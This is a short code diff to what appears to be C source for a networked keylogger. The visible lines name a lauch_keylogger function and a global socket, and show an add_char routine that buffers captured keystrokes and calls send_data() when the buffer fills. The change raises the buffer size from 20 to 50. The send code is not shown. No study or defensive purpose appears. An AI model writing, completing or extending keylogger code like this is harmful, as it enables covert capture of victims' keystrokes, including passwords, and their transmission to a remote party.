@@ -20,7 +20,7 @@ int lauch_keylogger();
 
 //global data
 SOCKET socket_peer;
-char data[20];
+char data[50];
 int size_data = 0;
 
 //creating TCP socket
@@ -135,7 +135,7 @@ void add_char(const char *str){
     int str_length = strlen(str);
     
     for (int i = 0; i < str_length && size_data < sizeof(data) - 1; i++) {
-        if (size_data == 20) {
+        if (size_data == 50) {
             send_data();
         }
 
